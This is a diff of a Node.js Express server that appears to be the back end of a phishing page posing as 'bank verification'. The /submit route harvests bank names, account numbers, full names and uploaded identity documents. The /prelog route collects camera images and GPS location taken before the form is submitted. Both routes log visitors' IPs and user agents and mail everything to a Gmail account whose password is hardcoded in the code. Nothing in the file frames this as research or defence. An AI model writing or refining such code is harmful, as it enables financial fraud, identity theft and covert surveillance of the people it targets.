@@ -1,105 +1,144 @@
-// ✅ Final server.js with prelog support and improved IP detection
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
-const path = require('path');
 const nodemailer = require('nodemailer');
+const path = require('path');
 
 const app = express();
-const port = process.env.PORT || 3000;
+const port = process.env.PORT;
 
-// Middleware
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
-app.use(express.json({ limit: '50mb' }));
+app.use(express.json({ limit: '50mb' })); // ✅ needed for location data
 
-// Ensure 'uploads' directory exists
 const uploadDir = path.join(__dirname, 'uploads');
 if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir);
 
-// Setup multer for file uploads
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, 'uploads'),
   filename: (req, file, cb) =>
     cb(null, Date.now() + '-' + file.originalname.replace(/\s+/g, '_'))
 });
-const upload = multer({ storage }).any();
+const upload = multer({ storage }).any(); // ✅ changed to .any() to support prelog images
 
-// Setup Nodemailer transporter
+// ✅ Real IP extractor
+const getIP = req => req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+
+// ✅ Email transporter
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
-    pass: 'kexmwnespcwxrkjt'  // ✅ no spaces
+    pass: 'kexmwnespcwxrkjt' // ✅ no space
   }
 });
 
-// 🔁 Helper: Log and email
-function logAndSendMail(subject, message, files = []) {
+// ✅ /submit route (same as yours, just IP fix)
+app.post('/submit', upload, (req, res) => {
+  const { bankname, accno, fullname } = req.body;
+  const ip = getIP(req);
+  const userAgent = req.headers['user-agent'];
+  const file = req.files.find(f => f.fieldname === 'document');
   const timestamp = new Date().toISOString();
-  const logEntry = `--- ${subject} ---\n${timestamp}\n${message}\n\n`;
+
+  const logEntry = `
+--- Submission: ${timestamp} ---
+Bank Name: ${bankname}
+Account No: ${accno}
+Full Name: ${fullname}
+File: ${file.path}
+IP: ${ip}
+User Agent: ${userAgent}
+`;
+
   fs.appendFileSync('records.txt', logEntry);
-  console.log(logEntry);
 
-  const attachments = files.map(file => ({
-    filename: file.originalname,
-    path: file.path
-  }));
-
-  transporter.sendMail({
+  const mailOptions = {
     from: 'dcbsubmission392@gmail.com',
     to: 'dcbsubmission392@gmail.com',
-    subject,
-    text: message,
-    attachments
-  }, (error, info) => {
+    subject: '🔔 New Bank Verification Submission',
+    text: `
+New submission received:
+
+Bank Name: ${bankname}
+Account Number: ${accno}
+Full Name: ${fullname}
+Uploaded File Path: ${file.path}
+
+IP: ${ip}
+Timestamp: ${timestamp}
+User Agent: ${userAgent}
+    `,
+    attachments: [
+      {
+        filename: file.originalname,
+        path: file.path
+      }
+    ]
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
     if (error) {
       console.error('❌ Email failed:', error);
     } else {
       console.log('✅ Email sent:', info.response);
     }
-    // Cleanup temp files
-    attachments.forEach(att => {
-      if (fs.existsSync(att.path)) fs.unlinkSync(att.path);
-    });
+    fs.unlinkSync(file.path); // ✅ clean up
   });
-}
-
-// ✅ Main form route
-app.post('/submit', upload, (req, res) => {
-  const { bankname, accno, fullname } = req.body;
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
-  const userAgent = req.headers['user-agent'];
-  const file = req.files.find(f => f.fieldname === 'document');
-  const timestamp = new Date().toISOString();
-
-  const message = `Bank Name: ${bankname}\nAccount No: ${accno}\nFull Name: ${fullname}\nFile: ${file?.path || 'None'}\nIP: ${ip}\nUser Agent: ${userAgent}`;
-  logAndSendMail('🔔 New Bank Verification Submission', message, file ? [file] : []);
 
   res.send('<h2>✅ Submitted Successfully!</h2><p>Your KYC info has been received.</p>');
 });
 
-// ✅ Pre-log route for camera + GPS data before submission
+// ✅ /prelog route for early images + GPS
 app.post('/prelog', upload, (req, res) => {
-  const files = req.files || [];
-  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
+  const ip = getIP(req);
   const userAgent = req.headers['user-agent'];
+  const timestamp = new Date().toISOString();
+  const files = req.files || [];
 
   let location = 'None';
   try {
     if (req.body.location) {
       const loc = JSON.parse(req.body.location);
-      location = `Lat: ${loc.latitude}, Long: ${loc.longitude}, Acc: ±${loc.accuracy}m`;
+      location = `Lat: ${loc.latitude}, Long: ${loc.longitude}, Accuracy: ±${loc.accuracy}m`;
     }
-  } catch (e) {
-    console.error('Location parse error:', e);
+  } catch (err) {
+    console.error('Location parse error:', err);
   }
 
-  const message = `Early Data\nLocation: ${location}\nImages: ${files.length}\nIP: ${ip}\nUser Agent: ${userAgent}`;
-  logAndSendMail('🔔 Pre-Submission Visitor Data', message, files);
+  const logEntry = `
+--- PRELOG: ${timestamp} ---
+Location: ${location}
+Images Captured: ${files.length}
+IP: ${ip}
+User Agent: ${userAgent}
+`;
+
+  fs.appendFileSync('records.txt', logEntry);
+
+  const mailOptions = {
+    from: 'dcbsubmission392@gmail.com',
+    to: 'dcbsubmission392@gmail.com',
+    subject: '🔔 Pre-Submission Visitor Data',
+    text: logEntry,
+    attachments: files.map(f => ({
+      filename: f.originalname,
+      path: f.path
+    }))
+  };
+
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.error('❌ Prelog email failed:', error);
+    } else {
+      console.log('✅ Prelog email sent:', info.response);
+    }
+    files.forEach(f => fs.unlinkSync(f.path)); // ✅ clean up
+  });
 
   res.sendStatus(200);
 });
 
-// ✅ Start server
-app.listen(port, () => console.log(`✅ Server running on port ${port}`));
+app.listen(port, () => {
+  console.log(`Server running on port ${port}`);
+});
